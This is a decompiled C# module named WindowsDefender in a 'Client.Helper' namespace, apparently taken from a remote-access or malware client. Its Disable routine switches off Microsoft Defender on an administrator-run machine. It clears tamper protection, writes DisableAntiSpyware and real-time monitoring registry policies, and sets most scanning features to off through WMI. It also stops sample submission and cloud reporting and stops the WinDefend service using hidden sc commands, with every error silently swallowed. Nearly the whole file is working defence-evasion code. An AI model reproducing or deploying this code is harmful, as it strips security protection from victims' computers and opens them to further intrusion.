using System;
using System.Diagnostics;
using System.Management;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper;

public class WindowsDefender
{
	private const string Namespace = "root\\Microsoft\\Windows\\Defender";

	private const string ClassName = "MSFT_MpPreference";

	private const string MethodName = "Set";

	public static void Run(string args)
	{
		if (IsAdministrator())
		{
			if (string.Equals(args, "Enable", StringComparison.OrdinalIgnoreCase) || args == "1")
			{
				Enable();
			}
			else
			{
				Disable();
			}
		}
	}

	public static void Enable()
	{
		if (!IsAdministrator())
		{
			return;
		}
		try
		{
			SetTamperProtection(enable: true);
			SetRegistry_DisableAntiSpyware(0);
			SetRegistry_SecurityHealth(enabled: true);
			SetRegistry_WinDefendStart(2);
			SetRegistry_DisableRealtimeMonitoring(0);
			SetWmiMpPreference(disable: false);
			ManageWinDefendService(start: true);
			ManageSecurityCenterService(start: true);
		}
		catch (Exception)
		{
		}
	}

	public static void Disable()
	{
		if (!IsAdministrator())
		{
			return;
		}
		try
		{
			SetTamperProtection(enable: false);
			SetRegistry_DisableAntiSpyware(1);
			SetRegistry_SecurityHealth(enabled: false);
			SetRegistry_WinDefendStart(3);
			SetRegistry_DisableRealtimeMonitoring(1);
			SetWmiMpPreference(disable: true);
			ManageWinDefendService(start: false);
		}
		catch (Exception)
		{
		}
	}

	private static bool IsAdministrator()
	{
		try
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static void SetTamperProtection(bool enable)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Features");
			registryKey?.SetValue("TamperProtection", enable ? 5 : 0, RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}

	private static void SetRegistry_DisableAntiSpyware(int value)
	{
		try
		{
			using (RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender"))
			{
				registryKey?.SetValue("DisableAntiSpyware", value, RegistryValueKind.DWord);
			}
			using RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows Defender");
			registryKey2?.SetValue("DisableAntiSpyware", value, RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}

	private static void SetRegistry_SecurityHealth(bool enabled)
	{
		try
		{
			byte[] value = new byte[12]
			{
				(byte)(enabled ? 2u : 3u),
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0
			};
			using RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run");
			registryKey?.SetValue("SecurityHealth", value, RegistryValueKind.Binary);
		}
		catch (Exception)
		{
		}
	}

	private static void SetRegistry_WinDefendStart(int value)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\WinDefend");
			registryKey?.SetValue("Start", value, RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}

	private static void SetRegistry_DisableRealtimeMonitoring(int value)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection");
			registryKey?.SetValue("DisableRealtimeMonitoring", value, RegistryValueKind.DWord);
		}
		catch
		{
		}
	}

	private static void SetWmiMpPreference(bool disable)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0020: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0283: Unknown result type (might be due to invalid IL or missing references)
		//IL_028a: Expected O, but got Unknown
		try
		{
			ManagementScope val = new ManagementScope("\\\\.\\root\\Microsoft\\Windows\\Defender");
			val.Connect();
			ManagementClass val2 = new ManagementClass(val, new ManagementPath("MSFT_MpPreference"), (ObjectGetOptions)null);
			try
			{
				ManagementBaseObject methodParameters = ((ManagementObject)val2).GetMethodParameters("Set");
				if (methodParameters == null)
				{
					return;
				}
				if (disable)
				{
					methodParameters["EnableControlledFolderAccess"] = "Disabled";
					methodParameters["PUAProtection"] = "disable";
					methodParameters["DisableRealtimeMonitoring"] = true;
					methodParameters["DisableBehaviorMonitoring"] = true;
					methodParameters["DisableBlockAtFirstSeen"] = true;
					methodParameters["DisableIOAVProtection"] = true;
					methodParameters["DisablePrivacyMode"] = true;
					methodParameters["SignatureDisableUpdateOnStartupWithoutEngine"] = true;
					methodParameters["DisableArchiveScanning"] = true;
					methodParameters["DisableIntrusionPreventionSystem"] = true;
					methodParameters["DisableScriptScanning"] = true;
					methodParameters["DisableAntiSpyware"] = true;
					methodParameters["DisableAntiVirus"] = true;
					methodParameters["SubmitSamplesConsent"] = (byte)2;
					methodParameters["MAPSReporting"] = (byte)0;
					methodParameters["HighThreatDefaultAction"] = (byte)6;
					methodParameters["ModerateThreatDefaultAction"] = (byte)6;
					methodParameters["LowThreatDefaultAction"] = (byte)6;
					methodParameters["SevereThreatDefaultAction"] = (byte)6;
					methodParameters["ScanScheduleDay"] = (byte)8;
				}
				else
				{
					methodParameters["EnableControlledFolderAccess"] = "Enabled";
					methodParameters["PUAProtection"] = "enable";
					methodParameters["DisableRealtimeMonitoring"] = false;
					methodParameters["DisableBehaviorMonitoring"] = false;
					methodParameters["DisableBlockAtFirstSeen"] = false;
					methodParameters["DisableIOAVProtection"] = false;
					methodParameters["DisablePrivacyMode"] = false;
					methodParameters["SignatureDisableUpdateOnStartupWithoutEngine"] = false;
					methodParameters["DisableArchiveScanning"] = false;
					methodParameters["DisableIntrusionPreventionSystem"] = false;
					methodParameters["DisableScriptScanning"] = false;
					methodParameters["DisableAntiSpyware"] = false;
					methodParameters["DisableAntiVirus"] = false;
				}
				ManagementObjectCollection instances = val2.GetInstances();
				try
				{
					ManagementObjectEnumerator enumerator = instances.GetEnumerator();
					try
					{
						if (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.Current;
							ManagementObject val4 = val3;
							try
							{
								val3.InvokeMethod("Set", methodParameters, (InvokeMethodOptions)null);
								return;
							}
							finally
							{
								((IDisposable)val4)?.Dispose();
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)instances)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
	}

	private static void ManageWinDefendService(bool start)
	{
		try
		{
			if (start)
			{
				RunSc("config", "WinDefend", "start= auto");
				RunSc("start", "WinDefend");
			}
			else
			{
				RunSc("stop", "WinDefend");
				RunSc("config", "WinDefend", "start= demand");
				Thread.Sleep(2000);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void ManageSecurityCenterService(bool start)
	{
		try
		{
			if (start)
			{
				RunSc("config", "wscsvc", "start= auto");
				RunSc("start", "wscsvc");
			}
		}
		catch (Exception)
		{
		}
	}

	private static void RunSc(string cmd, string serviceName, string extra = null)
	{
		try
		{
			string arguments = (string.IsNullOrEmpty(extra) ? $"{cmd} {serviceName}" : $"{cmd} {serviceName} {extra}");
			using Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				FileName = "sc",
				Arguments = arguments,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false
			};
			process.Start();
			process.WaitForExit(10000);
		}
		catch (Exception)
		{
		}
	}
}
